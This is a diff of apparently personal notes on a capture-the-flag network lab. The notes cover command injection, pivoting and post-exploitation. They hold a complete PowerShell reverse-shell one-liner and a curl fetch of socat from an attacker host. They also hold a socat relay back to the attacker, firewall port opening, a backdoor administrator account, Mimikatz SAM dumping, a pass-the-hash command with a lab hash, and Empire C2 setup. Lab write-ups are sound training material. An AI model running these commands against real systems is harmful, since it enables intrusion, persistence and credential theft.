@@ -396,7 +396,7 @@ MAC Address: 02:7A:BF:33:C3:ED (Unknown)
 ```
 
 ---
-# Tunneling
+# Pivoting
 
 ```php
 sshuttle -r username@address subnet
@@ -457,9 +457,337 @@ _Set the IP to the correct target for your choice of pivoting technique. If you 
 - I updated the script so that the files it creates have the provided naming convention.
 - It can now be executed with `./`
 
+![[Pasted image 20240721053404.png]]
+
 Now if everything worked we should be able to use that information in burpsuite repeater and gain a reverse shell.
 
 ![[Pasted image 20240720083047.png]]
 
-- I could try to modify the command to try to connect back to me with netcat or something else from pentester monkey's rev-shell cheat sheet.
+- Change `GET` request to `POST`
+- Add `Content-Type` header
+- Add in the command executed with a as the parameter
+
+```php
+Content-Type: application/x-www-form-urlencoded
+```
+
+- At some point we will need to URL encode the exploit for them to work
+
+![[Pasted image 20240721054802.png]]
+
+I have command execution.
+
+![[Pasted image 20240721055045.png]]
+
+I'm now going to check if it has access to the outside network by trying to get it to ping my attacker machine:
+
+- Start up a TCPDump listener on kali
+
+```php
+sudo tcpdump -i tun0 icmp
+```
+
+- Now in burp we can issue the command:
+
+```php
+ping -n 3 ATTACKING_IP
+```
+
+![[Pasted image 20240721055757.png]]
+
+_Don't forget to URL encode if you have issues with burp_
+
+![[Pasted image 20240721055911.png]]
+
+I have two easy options here:
+
+- Given I have a fully stable shell on .200, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat) and just catch the shell here
+- We could set up a relay on .200 to forward a shell back to a listener
+
+***Ensure that any ports you open are above 15000***
+
+Before we can do this, however, we need to take one other thing into account. CentOS uses an always-on wrapper around the IPTables firewall called "firewalld". By default, this firewall is extremely restrictive, only allowing access to SSH and anything else the sysadmin has specified. Before we can start capturing (or relaying) shells, we will need to open our desired port in the firewall. This can be done with the following command:  
+`firewall-cmd --zone=public --add-port PORT/tcp`
+
+```php
+firewall-cmd --zone=public --add-port 22888/tcp
+```
+
+![[Pasted image 20240721061859.png]]
+
+- In this command we are using two switches. First we set the zone to public -- meaning that the rule will apply to every inbound connection to this port. We then specify which port we want to open, along with the protocol we want to use (TCP).  
+
+- With that done, set up either a listener or a relay on .200.
+
+We can use a Powershell reverse shell for this. Take the following shell command and substitute in the IP of the webserver, and the port you opened in the `.200` firewall in the previous question where it says IP and PORT:
+
+```powershell
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Payload:
+```powershell
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.57.200',22888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+## Setting up SOCAT
+
+**Transfer SOCAT onto the webserver to setup the relay.**
+
+- Determine architecture so i can send the correct binary
+
+```php
+[root@prod-serv tmp]# uname -a
+Linux prod-serv 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+Binary folder locaton:
+1. `/opt/static-binaries/`
+2. `/usr/share/windows-binaries`
+
+**For example, with a Python webserver:**
+
+On Kali (inside the directory containing your Socat binary):
+
+`sudo python3 -m http.server 80`
+
+Then, on the target:  
+`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`
+
+```php
+curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
+```
+
+**On the Webserver:**
+
+**SOCAT Reverse Shell Relay**
+
+In this scenario we are using **socat** to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). 
+1. First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). 
+2. Next, on the compromised server, use the following command to start the relay:  
+`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`
+
+```php
+./socat tcp-l:22888 tcp:ATTACKING_IP:22888 &
+```
+
+_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._
+
+A brief explanation of the above command:
+
+- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
+- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
+- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.
+
+The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.
+
+_I tried using the provided ports but it failed. After using the port i opened earlier for both entries (22888), i get the relayed shell_
+
+![[Pasted image 20240721072239.png]]
+
+![[Pasted image 20240721072342.png]]
+
+Just the personal computer, `.100` left.
+
+---
+
+# Setting up a user/admin account
+
+First we create the account itself:  
+
+```php
+net user USERNAME PASSWORD /add
+``` 
+
+**_Account:_**
+Username:
+Platos
+
+Password:
+PlatosTHM13!3
+
+Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:  
+
+```php
+net localgroup Administrators USERNAME /add   
+```
+
+```php
+net localgroup "Remote Management Users" USERNAME /add
+```
+
+![[Pasted image 20240721073424.png]]
+
+With evil-winrm installed, we can connect to the target with the syntax shown here:  
+`evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP`
+
+```php
+evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP
+```
+
+_If you used an SSH portforward rather than sshuttle to access the Git Server, you will need to set up a second tunnel here to access port 5985. In this case you may also need to specify the target port using the -P switch (e.g. -_`i 127.0.0.1 -P 58950`_)._
+
+```php
+evil-winrm -u Platos -p 'PlatosTHM13!3' -i 10.200.57.150
+```
+
+![[Pasted image 20240721074043.png]]
+
+- I'm not going to use `xfreerdp` because i've used it before so i would rather try out evil-win which i've never used. 
+
+- Looking at the documents i can easily upload files with the following:
+
+```php
+upload local_filename destination_filename
+```
+
+So i'll upload mimikatz with evil-winrm.
+
+- I was having trouble with file paths so i just moved into the mimikatz dir and it uploaded.
+
+![[Pasted image 20240721080138.png]]
+
+- I'll try connecting with freerdp and using mimikatz because it wont run from evil-winrm, or i'm using it wrong
+
+```php
+xfreerdp /v:<IP>/u:<USER> /p:'password123!'
+```
+
+```php
+xfreerdp /v:10.200.57.150 /u:Platos /p:'PlatosTHM13!3' /dynamic-resolution +clipboard
+```
+
+- This method worked first time, so maybe you're just meant to use evil-win as a transfer tool in this step, but maybe it can be used and i just wasn't doing it correctly.
+
+![[Pasted image 20240721082043.png]]
+
+Now to dump the sam, but first:
+- `privilege::debug`   
+- `token::elevate`
+- Finally ``lsadump::sam``
+
+```php
+mimikatz # lsadump::sam
+Domain : GIT-SERV
+SysKey : 0841f6354f4b96d21b99345d07b66571
+ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
+ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
+```
+
+Okay, this didn't work so lets try sharing the resource this time with freerdp:
+
+_I re-ran it but with powershell in administrator mode and the privilege command worked this time, so this next part may not be necessary._ 
+
+![[Pasted image 20240721083505.png]]
+
+---
+
+```php
+xfreerdp /v:10.200.57.150 /u:Platos /p:'PlatosTHM13!3' /dynamic-resolution +clipboard /drive:/usr/share/windows-resources,share
+```
+
+1. With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. 
+
+2. Next we open up a `cmd.exe` or `PowerShell` window _as an administrator_ (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:  
+
+`\\tsclient\share\mimikatz\x64\mimikatz.exe`
+
+```php
+\\tsclient\share\mimikatz\x64\mimikatz.exe
+```
+
+**Not required, see above**
+
+--- 
+
+**We have the SAM Passwords!**
+
+I enter Thomas's password into crackstation:
+
+![[Pasted image 20240721083948.png]]
+
+**Username:**
+Thomas
+
+**Password:**
+i<3ruby
+
+---
+
+In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.
+
+For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.
+
+To do this we use the `-H` switch _instead of_ the `-p` switch we used before.
+
+For example:  
+`evil-winrm -u Administrator -H ADMIN_HASH -i IP'
+
+```php
+evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.57.150
+```
+
+That sets me up for the next section `Command and Control`
+
+**Completed:** _08:45 2024-07-21_
+
+---
+
+# Command and Control
+
+Install Empire & Starkiller:
+
+```php
+sudo apt install powershell-empire starkiller
+```
+
+With both installed, we now need to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller:  
+
+```php
+sudo powershell-empire server
+```
+
+Starting the Empire CLI Client is as easy as:  
+
+```php
+sudo powershell-empire client
+```
+
+![[Pasted image 20240721090302.png]]
+
+_With the server instance hosted locally this should connect automatically by default. If the Empire server was on a different machine then you would need to either change the connection information in the `/usr/share/powershell-empire/empire/client/config.yaml` file, or connect manually from the Empire CLI Client using `connect HOSTNAME --username=USERNAME --password=PASSWORD`._
+
+**StarKiller**
+
+With Empire server running:
+
+```php
+starkiller
+```
+
+**Username:** `empireadmin`
+
+**Password:** `password123`
+
+**URL:** `https://localhost:1337`
+
+---
+
+**Setup a listener**
+
+![[Pasted image 20240721091610.png]]
+
+![[Pasted image 20240721091706.png]]
+
+**Stagers**
+
+![[Pasted image 20240721092120.png]]
+
+- Submit
+- This brings us back to the stagers main menu where we are given the option to copy the stager to the clipboard by clicking on the "Actions" dropdown and selecting "Copy to Clipboard"
+- Now i can execute it on the target
+
+
+
+
 
